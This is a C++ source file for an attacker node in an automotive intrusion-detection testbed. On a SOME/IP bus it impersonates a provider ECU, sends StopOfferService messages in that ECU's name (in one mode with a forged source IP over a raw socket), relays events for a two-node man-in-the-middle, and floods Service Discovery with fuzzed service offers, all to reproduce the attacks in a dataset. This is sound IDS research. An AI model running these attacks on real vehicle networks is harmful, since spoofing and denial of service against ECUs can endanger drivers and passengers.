/**
 * @file      injector_ecu.cpp
 * @author    Guilherme Frick (frickoliveira.ee@gmail.com)
 * @brief     Injector of adversarial scenarios: an ECU on the live bus that reproduces, through the
 *            real SOME/IP stack, what the attacker nodes of the reference dataset do on the wire.
 * @version   1.2
 * @date      2026-11-02
 * @copyright Copyright (c) 2026
 *
 * @details   WHY A LIVE NODE. The earlier post-capture injection pasted bursts into a PCAP, and
 *            the reference dataset turned out to contain something else: Service Discovery attacks
 *            made by vsomeip applications, in which the VICTIMS subscribe to the attacker and open
 *            the TCP connection to it (tools/attack_flows.py). That only happens on a live bus, so
 *            the scenario has to run on one. This node does only what an ECU on the same Ethernet
 *            can do by following the protocol; nothing the stack would not allow.
 *
 * @details   SCENARIOS, each one the signature measured in the dataset:
 *            - @c dos: impersonate the VDE (node_10): same service, instance and published event,
 *              read from the matrix; another address; offers every 20 ms (tools/gen_injector_config.py).
 *              It declares ONLY the event it publishes, which makes it accept the ADAS and refuse
 *              CLU, PT and TEL, as the dataset attacker does. Constant payload. Captures victims only
 *              when up BEFORE the real provider.
 *            - @c mitm_single: the same impersonation, offers every 10 ms, entering AFTER the VDE.
 *              What captures the ADAS is a StopOfferService in the VDE's name, every ~2.5 s, from this
 *              node's own address through an ordinary UDP socket (src/nodes/SdRawEmitter.hpp). It
 *              publishes the attacker's own false signal, replayed from a bank, every 10 ms.
 *            - @c mitm_relay: first link of the two-node man in the middle (.14). Subscribes to the
 *              VDE as an ordinary client and republishes the last value it received on a relay
 *              service (0x100B, instance 0x000B) every ~9 ms. Up BEFORE the VDE.
 *            - @c mitm_impostor: second link (.15). Impersonates the VDE at the normal offer pace,
 *              subscribes to the relay, and sends the ADAS one StopOfferService per relayed
 *              notification it receives, with the VDE's address FORGED through a raw socket. Publishes
 *              a constant payload every 2 s. Entering ~3.4 s after the VDE.
 *            - @c fuzzy: offer @c INJ_FUZZ_COUNT services from @c INJ_FUZZ_FIRST, instance equal to
 *              the service identifier, publishing nothing.
 *
 * @details   Environment (defaults in parentheses are the measured ones):
 *            - @c INJ_SCENARIO          one of the above; required.
 *            - @c INJ_APP               vsomeip application name; must match the configuration (@c injector).
 *            - @c INJ_LOCAL_IP          this node's address; needed by the ordinary StopOffer sender.
 *            - @c INJ_IMPERSONATE       matrix node to impersonate (@c node_10).
 *            - @c INJ_PUBLISH_EVENT     the one event to publish (0x0001).
 *            - @c INJ_PERIOD_MS         publishing period (21 dos, 10 mitm_single, 9 mitm_relay, 2000 mitm_impostor).
 *            - @c INJ_PAYLOAD           @c constant or @c bank (bank in mitm_single, constant otherwise).
 *            - @c INJ_PAYLOAD_HEX       the constant payload (the one each dataset attacker publishes).
 *            - @c INJ_PAYLOAD_FILE      the bank (build/cfg/attacker-mitm_single.bin).
 *            - @c INJ_DECLARE           @c published or @c all events of the impersonated provider (@c published).
 *            - @c INJ_RELAY_SERVICE / @c INJ_RELAY_INSTANCE / @c INJ_RELAY_EVENT / @c INJ_RELAY_EVENTGROUP
 *                                       relay service (0x100B / 0x000B / 0x0001 / 0x0001).
 *            - @c INJ_SO_TARGET_NODE    matrix node that receives the StopOffer (node_2 in both MITM).
 *            - @c INJ_SO_PERIOD_MS      period of the periodic StopOffer (2500).
 *            - @c INJ_SO_TRIGGER        @c period, or @c received: one StopOffer per relayed notification.
 *            - @c INJ_SO_MODE           @c udp (own address, ordinary socket) or @c raw (forged source).
 *            - @c INJ_SO_SRC_IP         raw mode: source address to forge (the impersonated node's).
 *            - @c INJ_SO_SESSION        @c fixed (always 1) or @c increment.
 *            - @c INJ_FUZZ_FIRST / @c INJ_FUZZ_COUNT  fuzzy (0x2001 / 200).
 *            - @c INJ_RUN_SECONDS, @c INJ_READY_TIMEOUT_MS, @c INJ_REPORT_SECONDS.
 */
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include "src/libecu/NodeRuntime.hpp"
#include "src/nodes/MatrixPlan.hpp"
#include "src/nodes/PayloadBank.hpp"
#include "src/nodes/SdRawEmitter.hpp"

namespace
{

/// Set by the signal handler so the loop can leave cleanly.
std::atomic<bool> g_stop(false);

/**
 * @brief Handler for SIGINT and SIGTERM.
 * @param[in] signalNumber Signal received; not used.
 * @return None.
 */
void OnSignal(int signalNumber)
{
    static_cast<void>(signalNumber);
    g_stop.store(true);
}

constexpr std::uint32_t             kDefaultReadyMs = 10000U; ///< Default wait for the routing manager.
constexpr std::uint32_t             kDefaultReportS = 5U;     ///< Default period of the counters line.
constexpr std::uint16_t             kSdPort         = 30490U; ///< Service Discovery port.
constexpr std::uint32_t             kMaxStopOffersPerTurn = 64U; ///< Bound on a burst of triggered StopOffers.
constexpr std::chrono::milliseconds kIdleStep{100};           ///< Longest sleep with nothing due.
constexpr std::chrono::milliseconds kTriggeredStep{1};        ///< Poll step while StopOffers are triggered by reception.
constexpr std::chrono::milliseconds kAvailabilityStep{5000};  ///< Each wait for a consumed service.

/// Constant payload of the DoS attacker (.11), 69 393 notifications (tools/attacker_payload.py).
const char *const kDosPayloadHex = "2f1a16d52afcf4d9becd0bc30b01e17bb222ab1d9f852e72";
/// Constant payload the impostor of the multi-node man in the middle (.15) sends the ADAS.
const char *const kImpostorPayloadHex = "ae47e17a146e2e40008195438b6cc7bf0000000000000000";

/**
 * @brief Read an environment variable as text.
 * @param[in] name     Variable to read.
 * @param[in] fallback Value to use when it is unset or empty.
 * @return The value, or @p fallback.
 */
std::string Env(const char *name, const char *fallback)
{
    const char *const v = std::getenv(name);
    return ((v != nullptr) && (v[0] != '\0')) ? std::string(v) : std::string(fallback);
}

/**
 * @brief Read an environment variable as an unsigned number, decimal or 0x-prefixed hexadecimal.
 * @param[in] name     Variable to read.
 * @param[in] fallback Value to use when it is unset, empty or not a number.
 * @return The value, or @p fallback.
 */
std::uint32_t EnvNumber(const char *name, std::uint32_t fallback)
{
    const std::string text = Env(name, "");
    if (text.empty())
    {
        return fallback;
    }
    else
    {
        /* Something was set: try to read it. */
    }
    char *end             = nullptr;
    const unsigned long v = std::strtoul(text.c_str(), &end, 0);
    return ((end != nullptr) && (*end == '\0')) ? static_cast<std::uint32_t>(v) : fallback;
}

/**
 * @brief Decode a hexadecimal string.
 * @param[in]  text  Even number of hexadecimal digits.
 * @param[out] bytes Decoded bytes.
 * @return Whether the text was valid.
 */
bool DecodeHex(const std::string &text, std::vector<std::uint8_t> &bytes)
{
    bytes.clear();
    if ((text.size() % 2U) != 0U)
    {
        return false;
    }
    else
    {
        /* Even length. */
    }
    for (std::size_t i = 0U; i < text.size(); i += 2U)
    {
        char             *end = nullptr;
        const std::string par = text.substr(i, 2U);
        const unsigned long v = std::strtoul(par.c_str(), &end, 16);
        if ((end == nullptr) || (*end != '\0'))
        {
            return false;
        }
        else
        {
            bytes.push_back(static_cast<std::uint8_t>(v));
        }
    }
    return true;
}

/**
 * @brief Address of a matrix node.
 * @param[in]  name Node name.
 * @param[out] ip   Host byte order.
 * @return Whether the node exists and its address parses.
 */
bool IpDoNo(const std::string &name, std::uint32_t &ip)
{
    const ids::matrix::table::Table<ids::matrix::table::NodeDesc> nos = ids::matrix::table::Nodes();
    for (std::size_t i = 0U; i < nos.count; ++i)
    {
        if (name == nos.items[i].name)
        {
            return ids::nodes::ParseIpv4(nos.items[i].ip, ip);
        }
        else
        {
            /* Keep looking. */
        }
    }
    return false;
}

/**
 * @brief Everything needed to send the StopOffer, prepared before the stack comes up.
 */
struct StopOfferPlan
{
    bool                      ativo            = false; ///< Whether this scenario sends it.
    bool                      bruto            = false; ///< Raw socket with forged source, or ordinary UDP socket.
    bool                      sessaoIncrementa = false; ///< Session counts up, or stays 1.
    bool                      porRecepcao      = false; ///< One per relayed notification, or periodic.
    ids::nodes::StopOfferSpec spec;                     ///< What the entry withdraws.
    ids::nodes::RawHeaderSpec cabecalho;                ///< Raw mode: IPv4 and UDP header fields.
    std::uint32_t             destino   = 0U;           ///< Victim address.
    std::uint32_t             periodoMs = 0U;           ///< Period, when periodic.
};

/**
 * @brief One event this node publishes, whoever it is pretending to be.
 */
struct Publicacao
{
    bool                 ativo     = false; ///< Whether anything is published.
    ids::ecu::ServiceId  service   = 0U;    ///< Service.
    ids::ecu::InstanceId instance  = 0U;    ///< Instance.
    ids::ecu::EventId    notifier  = 0U;    ///< Event.
    std::size_t          bytes     = 0U;    ///< Expected size.
    std::uint32_t        periodoMs = 0U;    ///< Period.
};

/**
 * @brief What arrives from a consumed service, shared with the stack thread.
 */
struct Recepcao
{
    std::mutex                mutex;          ///< Guards everything below.
    std::vector<std::uint8_t> ultimo;         ///< Last payload received; empty before the first.
    std::uint64_t             recebidos  = 0U; ///< How many arrived.
    std::uint64_t             pendentes  = 0U; ///< Arrivals not yet answered with a StopOffer.
};

} // namespace

int main()
{
    static_cast<void>(std::setvbuf(stdout, nullptr, _IOLBF, 0));

    const std::string cenario     = Env("INJ_SCENARIO", "");
    const bool        personifica = (cenario == "dos") || (cenario == "mitm_single") || (cenario == "mitm_impostor");
    const bool        repassa     = (cenario == "mitm_relay");
    const bool        consomeRelay = (cenario == "mitm_impostor");
    if ((!personifica) && (!repassa) && (cenario != "fuzzy"))
    {
        std::printf("[injector] ERRO: INJ_SCENARIO deve ser dos, mitm_single, mitm_relay, mitm_impostor ou fuzzy (veio \"%s\")\n",
                    cenario.c_str());
        return 2;
    }
    else
    {
        /* A known scenario. */
    }

    const std::string   app        = Env("INJ_APP", "injector");
    const std::uint32_t runSegs    = EnvNumber("INJ_RUN_SECONDS", 0U);
    const std::uint32_t prontoMs   = EnvNumber("INJ_READY_TIMEOUT_MS", kDefaultReadyMs);
    const std::uint32_t reportSegs = EnvNumber("INJ_REPORT_SECONDS", kDefaultReportS);

    /* O serviço de repasse do MITM multi: o .14 oferece, o .15 assina. */
    const ids::ecu::ServiceId    relaySvc   = static_cast<ids::ecu::ServiceId>(EnvNumber("INJ_RELAY_SERVICE", 0x100BU));
    const ids::ecu::InstanceId   relayInst  = static_cast<ids::ecu::InstanceId>(EnvNumber("INJ_RELAY_INSTANCE", 0x000BU));
    const ids::ecu::EventId      relayEvt   = static_cast<ids::ecu::EventId>(EnvNumber("INJ_RELAY_EVENT", 0x0001U));
    const ids::ecu::EventgroupId relayGrupo = static_cast<ids::ecu::EventgroupId>(EnvNumber("INJ_RELAY_EVENTGROUP", 0x0001U));

    /* ---- what to declare, decided before the stack exists ---- */

    ids::nodes::NodePlan       plano;
    std::vector<std::uint8_t>  constante;
    ids::nodes::PayloadBank    banco;
    ids::nodes::PayloadStream *fluxo = nullptr;
    ids::nodes::EventPlan      publicadoPlano;
    Publicacao                 pub;
    StopOfferPlan              so;
    const std::uint32_t        fuzzPrimeiro = EnvNumber("INJ_FUZZ_FIRST", 0x2001U);
    const std::uint32_t        fuzzQuantos  = EnvNumber("INJ_FUZZ_COUNT", 200U);

    /* O provedor legítimo: personificado pelos três primeiros cenários, ASSINADO pelo .14. */
    const std::string alvo = Env("INJ_IMPERSONATE", "node_10");
    if (personifica || repassa)
    {
        plano = ids::nodes::PlanFor(alvo.c_str());
        if ((plano.node == nullptr) || (!plano.problem.empty()) || (plano.node->provideCount == 0U))
        {
            std::printf("[injector] ERRO: %s não é um provedor usável da matriz (%s)\n", alvo.c_str(), plano.problem.c_str());
            return 2;
        }
        else
        {
            /* A provider to impersonate or to listen to. */
        }
        const ids::ecu::EventId evento = static_cast<ids::ecu::EventId>(EnvNumber("INJ_PUBLISH_EVENT", 0x0001U));
        bool                    achou  = false;
        for (std::size_t i = 0U; i < plano.publishes.size(); ++i)
        {
            if (plano.publishes[i].notifier == evento)
            {
                publicadoPlano = plano.publishes[i];
                achou          = true;
            }
            else
            {
                /* Not this one. */
            }
        }
        if (!achou)
        {
            std::printf("[injector] ERRO: %s não publica o evento 0x%04X\n", alvo.c_str(), static_cast<unsigned>(evento));
            return 2;
        }
        else
        {
            /* Event found. */
        }
    }
    else
    {
        /* Fuzzy needs no matrix node. */
    }

    if (personifica)
    {
        const std::uint32_t periodoPadrao = (cenario == "dos") ? 21U : ((cenario == "mitm_single") ? 10U : 2000U);
        pub.ativo     = true;
        pub.service   = publicadoPlano.service;
        pub.instance  = publicadoPlano.instance;
        pub.notifier  = publicadoPlano.notifier;
        pub.bytes     = publicadoPlano.bytes;
        pub.periodoMs = EnvNumber("INJ_PERIOD_MS", periodoPadrao);

        /* Conteúdo. Um banco ruim é fatal: seguir com outro conteúdo produziria uma rodada
         * que parece a pedida e mede outra coisa. */
        const std::string politica = Env("INJ_PAYLOAD", (cenario == "mitm_single") ? "bank" : "constant");
        if (politica == "bank")
        {
            const std::string arquivo = Env("INJ_PAYLOAD_FILE", "build/cfg/attacker-mitm_single.bin");
            banco                     = ids::nodes::PayloadBank::FromFile(arquivo);
            fluxo = banco.Problem().empty() ? banco.Find(pub.service, pub.notifier) : nullptr;
            if (fluxo == nullptr)
            {
                std::printf("[injector] ERRO no banco %s: %s\n", arquivo.c_str(),
                            banco.Problem().empty() ? "não tem o evento publicado" : banco.Problem().c_str());
                return 2;
            }
            else if (fluxo->SampleSize() != pub.bytes)
            {
                std::printf("[injector] ERRO: o banco tem %zu B e a matriz %zu B\n", fluxo->SampleSize(), pub.bytes);
                return 2;
            }
            else
            {
                std::printf("[injector] conteúdo: banco %s\n", arquivo.c_str());
            }
        }
        else if (!DecodeHex(Env("INJ_PAYLOAD_HEX", (cenario == "mitm_impostor") ? kImpostorPayloadHex : kDosPayloadHex), constante))
        {
            std::printf("[injector] ERRO: INJ_PAYLOAD_HEX não é hexadecimal válido\n");
            return 2;
        }
        else
        {
            std::printf("[injector] conteúdo: %zu B constantes\n", constante.size());
        }

        /* StopOffer em nome do personificado, com os endpoints DELE, lidos da matriz. */
        const bool        mitm   = (cenario == "mitm_single") || (cenario == "mitm_impostor");
        const std::string alvoSo = Env("INJ_SO_TARGET_NODE", mitm ? "node_2" : "");
        if (!alvoSo.empty())
        {
            const ids::matrix::table::ServiceDesc *const svc = ids::matrix::table::FindService(plano.node->provides[0]);
            const bool                                   multi = (cenario == "mitm_impostor");
            so.ativo            = true;
            so.bruto            = (Env("INJ_SO_MODE", multi ? "raw" : "udp") == "raw");
            so.sessaoIncrementa = (Env("INJ_SO_SESSION", multi ? "increment" : "fixed") == "increment");
            so.porRecepcao      = (Env("INJ_SO_TRIGGER", multi ? "received" : "period") == "received");
            so.periodoMs        = EnvNumber("INJ_SO_PERIOD_MS", 2500U);
            so.spec.service     = svc->id;
            so.spec.instance    = svc->instance;
            so.spec.tcpPort     = svc->hasTcp ? svc->tcpPort : static_cast<ids::ecu::Port>(0U);
            so.spec.udpPort     = svc->hasUdp ? svc->udpPort : static_cast<ids::ecu::Port>(0U);
            bool ok             = ids::nodes::ParseIpv4(plano.node->ip, so.spec.providerIp) && IpDoNo(alvoSo, so.destino);
            if (so.bruto)
            {
                ok = ok && ids::nodes::ParseIpv4(Env("INJ_SO_SRC_IP", plano.node->ip), so.cabecalho.srcIp);
                so.cabecalho.dstIp        = so.destino;
                so.cabecalho.dontFragment = false;
                so.cabecalho.udpChecksum  = false;
            }
            else
            {
                /* Ordinary socket: the kernel fills the headers. */
            }
            if (!ok)
            {
                std::printf("[injector] ERRO: endereços do StopOffer inválidos (alvo %s)\n", alvoSo.c_str());
                return 2;
            }
            else
            {
                std::printf("[injector] StopOffer de 0x%04X em nome de %s para %s, %s, %s, sessão %s\n",
                            static_cast<unsigned>(svc->id), alvo.c_str(), alvoSo.c_str(),
                            so.porRecepcao ? "um por notificação repassada" : "periódico",
                            so.bruto ? "socket bruto com origem forjada" : "socket UDP do próprio IP",
                            so.sessaoIncrementa ? "incrementando" : "fixa em 1");
            }
        }
        else
        {
            /* No StopOffer in this scenario. */
        }

        std::printf("[injector] %s: personifica %s (%s), publica só 0x%04X a cada %u ms\n", cenario.c_str(), alvo.c_str(),
                    plano.node->appName, static_cast<unsigned>(pub.notifier), static_cast<unsigned>(pub.periodoMs));
    }
    else if (repassa)
    {
        pub.ativo     = true;
        pub.service   = relaySvc;
        pub.instance  = relayInst;
        pub.notifier  = relayEvt;
        pub.bytes     = publicadoPlano.bytes;
        pub.periodoMs = EnvNumber("INJ_PERIOD_MS", 9U);
        std::printf("[injector] mitm_relay: assina %s e repassa o evento 0x%04X por 0x%04X/0x%04X a cada %u ms\n", alvo.c_str(),
                    static_cast<unsigned>(publicadoPlano.notifier), static_cast<unsigned>(relaySvc), static_cast<unsigned>(relayInst),
                    static_cast<unsigned>(pub.periodoMs));
    }
    else
    {
        std::printf("[injector] fuzzy: oferece %u serviço(s) a partir de 0x%04X, sem publicar\n", static_cast<unsigned>(fuzzQuantos),
                    static_cast<unsigned>(fuzzPrimeiro));
    }

    /* Os sockets do StopOffer abrem ANTES da pilha subir: falhar aqui é falhar cedo, sem
     * deixar um atacante no ar que não faz o que o cenário diz. */
    ids::nodes::UdpSdSender udpSo;
    ids::nodes::RawIpSender rawSo;
    if (so.ativo)
    {
        std::string erro;
        if (so.bruto)
        {
            erro = rawSo.Open();
        }
        else
        {
            std::uint32_t local = 0U;
            erro = ids::nodes::ParseIpv4(Env("INJ_LOCAL_IP", ""), local) ? udpSo.Open(local, kSdPort)
                                                                          : std::string("INJ_LOCAL_IP ausente ou inválido");
        }
        if (!erro.empty())
        {
            std::printf("[injector] ERRO abrindo o emissor de StopOffer: %s\n", erro.c_str());
            return 1;
        }
        else
        {
            /* Sender ready. */
        }
    }
    else
    {
        /* Nothing to open. */
    }

    ara::core::Result<std::unique_ptr<ids::ecu::NodeRuntime>> criado = ids::ecu::NodeRuntime::Create(app);
    if (!criado.HasValue())
    {
        std::printf("[injector] ERRO criando o runtime: %s\n", criado.Error().Message());
        return 1;
    }
    else
    {
        /* Application created. */
    }
    ids::ecu::NodeRuntime &runtime = *criado.Value();

    /* Depois do Create(), pelo mesmo motivo do generic_ecu: o init() do vsomeip
     * sobrescreve um handler instalado antes. */
    std::signal(SIGINT, OnSignal);
    std::signal(SIGTERM, OnSignal);

    /* ---- declaração ---- */

    std::vector<ids::ecu::EventgroupId> gruposRelay(1U, relayGrupo);
    if (personifica)
    {
        for (std::size_t i = 0U; i < plano.node->provideCount; ++i)
        {
            const ids::matrix::table::ServiceDesc *const svc = ids::matrix::table::FindService(plano.node->provides[i]);
            const ara::core::Result<void>                r   = runtime.ProvideService(svc->id, svc->instance);
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando %s: %s\n", plano.node->provides[i], r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
        /* Por padrão, SÓ o evento publicado. No dataset o .11 confirma a assinatura da
         * ADAS (eventgroup do evento 0x0001) e RECUSA as de CLU, PT e TEL (eventgroups 2,
         * 3 e 4), que ficam reconectando. INJ_DECLARE=all fica para comparação. */
        const bool declaraTodos = (Env("INJ_DECLARE", "published") == "all");
        for (std::size_t i = 0U; i < plano.publishes.size(); ++i)
        {
            const ids::nodes::EventPlan &ep = plano.publishes[i];
            if ((!declaraTodos) && (ep.notifier != pub.notifier))
            {
                continue;
            }
            else
            {
                /* Declared. */
            }
            const ara::core::Result<void> r =
                runtime.ProvideEvent(ep.service, ep.instance, ep.notifier, ids::ecu::EventgroupIds(ep.eventgroups.data(), ep.eventgroups.size()),
                                     ep.isField, std::chrono::milliseconds::zero(), ep.transport);
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando evento 0x%04X: %s\n", static_cast<unsigned>(ep.notifier), r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
    }
    else if (repassa)
    {
        /* Provedor do serviço de repasse e consumidor do provedor legítimo. */
        ara::core::Result<void> r = runtime.ProvideService(relaySvc, relayInst);
        if (r.HasValue())
        {
            r = runtime.ProvideEvent(relaySvc, relayInst, relayEvt, ids::ecu::EventgroupIds(gruposRelay.data(), gruposRelay.size()),
                                     publicadoPlano.isField, std::chrono::milliseconds::zero(), ids::ecu::Transport::Reliable);
        }
        else
        {
            /* Fall through to the error below. */
        }
        if (r.HasValue())
        {
            r = runtime.ConsumeService(publicadoPlano.service, publicadoPlano.instance);
        }
        else
        {
            /* Fall through to the error below. */
        }
        if (!r.HasValue())
        {
            std::printf("[injector] ERRO declarando o repasse: %s\n", r.Error().Message());
            return 1;
        }
        else
        {
            /* Declared. */
        }
    }
    else
    {
        for (std::uint32_t i = 0U; i < fuzzQuantos; ++i)
        {
            const ids::ecu::ServiceId     svc = static_cast<ids::ecu::ServiceId>(fuzzPrimeiro + i);
            const ara::core::Result<void> r   = runtime.ProvideService(svc, static_cast<ids::ecu::InstanceId>(svc));
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando 0x%04X: %s\n", static_cast<unsigned>(svc), r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
    }
    if (consomeRelay)
    {
        const ara::core::Result<void> r = runtime.ConsumeService(relaySvc, relayInst);
        if (!r.HasValue())
        {
            std::printf("[injector] ERRO declarando consumo do repasse: %s\n", r.Error().Message());
            return 1;
        }
        else
        {
            /* Declared. */
        }
    }
    else
    {
        /* Nothing consumed. */
    }

    /* O que chega: o .14 guarda o último valor da VDE; o .15 conta cada repasse, porque
     * cada um dispara um StopOffer forjado. */
    Recepcao rec;
    runtime.SetReceiveHandler([&rec](ids::ecu::ServiceId, ids::ecu::InstanceId, ids::ecu::EventId, ids::ecu::ByteView payload) {
        std::lock_guard<std::mutex> lock(rec.mutex);
        rec.ultimo.assign(payload.data(), payload.data() + payload.size());
        ++rec.recebidos;
        ++rec.pendentes;
    });

    /* ---- subida ---- */

    const ara::core::Result<void> iniciado = runtime.Start();
    if (!iniciado.HasValue())
    {
        std::printf("[injector] ERRO subindo a pilha: %s\n", iniciado.Error().Message());
        return 1;
    }
    else
    {
        /* Stack coming up. */
    }
    const ara::core::Result<void> registrado = runtime.WaitUntilRegistered(std::chrono::milliseconds(prontoMs));
    if (!registrado.HasValue())
    {
        std::printf("[injector] ERRO: %s\n", registrado.Error().Message());
        return 1;
    }
    else
    {
        std::printf("[injector] registrado no routing manager\n");
    }
    const ara::core::Result<void> ofertado = runtime.Offer();
    if (!ofertado.HasValue())
    {
        std::printf("[injector] ERRO ofertando: %s\n", ofertado.Error().Message());
        return 1;
    }
    else
    {
        std::printf("[injector] ofertas no ar\n");
    }

    /* Assinatura: o .14 na VDE, o .15 no repasse. Espera em passos, porque o provedor pode
     * subir depois (o .14 sobe antes da VDE). */
    if (repassa || consomeRelay)
    {
        const ids::ecu::ServiceId    s   = repassa ? publicadoPlano.service : relaySvc;
        const ids::ecu::InstanceId   ins = repassa ? publicadoPlano.instance : relayInst;
        const ids::ecu::EventId      ev  = repassa ? publicadoPlano.notifier : relayEvt;
        const std::vector<ids::ecu::EventgroupId> grupos = repassa ? publicadoPlano.eventgroups : gruposRelay;
        bool disponivel = false;
        while ((!disponivel) && (!g_stop.load()))
        {
            disponivel = runtime.WaitUntilAvailable(s, ins, kAvailabilityStep).HasValue();
            if (!disponivel)
            {
                std::printf("[injector] esperando 0x%04X/0x%04X aparecer\n", static_cast<unsigned>(s), static_cast<unsigned>(ins));
            }
            else
            {
                /* Found. */
            }
        }
        const ara::core::Result<void> r =
            runtime.Subscribe(s, ins, ev, ids::ecu::EventgroupIds(grupos.data(), grupos.size()), ids::ecu::Transport::Reliable);
        if (!r.HasValue())
        {
            std::printf("[injector] ERRO assinando 0x%04X: %s\n", static_cast<unsigned>(s), r.Error().Message());
            return 1;
        }
        else
        {
            std::printf("[injector] assinou 0x%04X/0x%04X evento 0x%04X\n", static_cast<unsigned>(s), static_cast<unsigned>(ins),
                        static_cast<unsigned>(ev));
        }
    }
    else
    {
        /* Nothing to subscribe. */
    }

    /* ---- laço ---- */

    const std::chrono::steady_clock::time_point inicio        = std::chrono::steady_clock::now();
    std::chrono::steady_clock::time_point       proximoEnvio  = inicio;
    std::chrono::steady_clock::time_point       proximoSo     = inicio;
    std::chrono::steady_clock::time_point       proximoReport = inicio + std::chrono::seconds(reportSegs);
    std::uint64_t                               enviados      = 0U;
    std::uint64_t                               falhas        = 0U;
    std::uint64_t                               stopOffers    = 0U;
    std::uint16_t                               sessaoSo      = 1U;
    std::uint16_t                               ipId          = 1U;
    std::vector<std::uint8_t>                   copia;

    while (!g_stop.load())
    {
        if (!runtime.IsRegistered())
        {
            std::printf("[injector] a pilha saiu do ar; encerrando\n");
            break;
        }
        else
        {
            /* Still registered. */
        }
        const std::chrono::steady_clock::time_point agora = std::chrono::steady_clock::now();
        if ((runSegs > 0U) && (agora >= (inicio + std::chrono::seconds(runSegs))))
        {
            break;
        }
        else
        {
            /* Keep running. */
        }

        std::chrono::steady_clock::time_point acorda = agora + kIdleStep;

        /* Publicação: constante, banco, ou (no .14) o último valor recebido da VDE. */
        if (pub.ativo && (agora >= proximoEnvio))
        {
            bool temConteudo = true;
            if (repassa)
            {
                std::lock_guard<std::mutex> lock(rec.mutex);
                copia       = rec.ultimo;
                temConteudo = !copia.empty();
            }
            else
            {
                /* Not a relay. */
            }
            if (temConteudo)
            {
                const ids::ecu::ByteView bytes = repassa ? ids::ecu::ByteView(copia.data(), copia.size())
                                                         : ((fluxo != nullptr) ? fluxo->Next()
                                                                               : ids::ecu::ByteView(constante.data(), constante.size()));
                const ara::core::Result<void> r = runtime.Send(pub.service, pub.instance, pub.notifier, bytes);
                if (r.HasValue())
                {
                    ++enviados;
                }
                else
                {
                    ++falhas;
                }
            }
            else
            {
                /* The relay has nothing to repeat yet. */
            }
            /* Avança a partir do previsto, não de agora, para a taxa média não escorregar. */
            proximoEnvio += std::chrono::milliseconds(pub.periodoMs);
            if (proximoEnvio < agora)
            {
                proximoEnvio = agora + std::chrono::milliseconds(pub.periodoMs);
            }
            else
            {
                /* On schedule. */
            }
        }
        else
        {
            /* Nothing to publish now. */
        }
        if (pub.ativo && (proximoEnvio < acorda))
        {
            acorda = proximoEnvio;
        }
        else
        {
            /* The idle step comes first. */
        }

        /* StopOffer: periódico (MITM single) ou um por repasse recebido (MITM multi). */
        std::uint64_t aEnviar = 0U;
        if (so.ativo && so.porRecepcao)
        {
            std::lock_guard<std::mutex> lock(rec.mutex);
            aEnviar       = (rec.pendentes < kMaxStopOffersPerTurn) ? rec.pendentes : kMaxStopOffersPerTurn;
            rec.pendentes -= aEnviar;
        }
        else if (so.ativo && (agora >= proximoSo))
        {
            aEnviar   = 1U;
            proximoSo = agora + std::chrono::milliseconds(so.periodoMs);
        }
        else
        {
            /* Nothing due. */
        }
        for (std::uint64_t k = 0U; k < aEnviar; ++k)
        {
            so.spec.session                     = sessaoSo;
            const std::vector<std::uint8_t> msg = ids::nodes::BuildStopOffer(so.spec);
            bool                            ok  = false;
            if (so.bruto)
            {
                so.cabecalho.ipId = ipId;
                ++ipId;
                ok = rawSo.Send(ids::nodes::BuildIpv4Udp(so.cabecalho, msg), so.destino);
            }
            else
            {
                ok = udpSo.Send(msg, so.destino, kSdPort);
            }
            if (ok)
            {
                ++stopOffers;
            }
            else
            {
                ++falhas;
            }
            if (so.sessaoIncrementa)
            {
                sessaoSo = static_cast<std::uint16_t>((sessaoSo == 0xFFFFU) ? 1U : (sessaoSo + 1U));
            }
            else
            {
                /* Fixed at 1, as the single-node attacker of the dataset. */
            }
        }
        if (so.ativo && so.porRecepcao)
        {
            const std::chrono::steady_clock::time_point passo = agora + kTriggeredStep;
            if (passo < acorda)
            {
                acorda = passo;
            }
            else
            {
                /* Already sooner. */
            }
        }
        else if (so.ativo && (proximoSo < acorda))
        {
            acorda = proximoSo;
        }
        else
        {
            /* The other deadlines come first. */
        }

        if ((reportSegs > 0U) && (agora >= proximoReport))
        {
            std::uint64_t recebidos = 0U;
            {
                std::lock_guard<std::mutex> lock(rec.mutex);
                recebidos = rec.recebidos;
            }
            std::printf("[injector] %s: %llu enviados, %llu recebidos, %llu StopOffer, %llu falhas\n", cenario.c_str(),
                        static_cast<unsigned long long>(enviados), static_cast<unsigned long long>(recebidos),
                        static_cast<unsigned long long>(stopOffers), static_cast<unsigned long long>(falhas));
            proximoReport = agora + std::chrono::seconds(reportSegs);
        }
        else
        {
            /* Not time to report. */
        }
        std::this_thread::sleep_until(acorda);
    }

    std::uint64_t recebidosFim = 0U;
    {
        std::lock_guard<std::mutex> lock(rec.mutex);
        recebidosFim = rec.recebidos;
    }
    runtime.StopOffer();
    std::printf("[injector] encerrando, %llu enviados, %llu recebidos, %llu StopOffer, %llu falhas\n",
                static_cast<unsigned long long>(enviados), static_cast<unsigned long long>(recebidosFim),
                static_cast<unsigned long long>(stopOffers), static_cast<unsigned long long>(falhas));
    return 0;
}
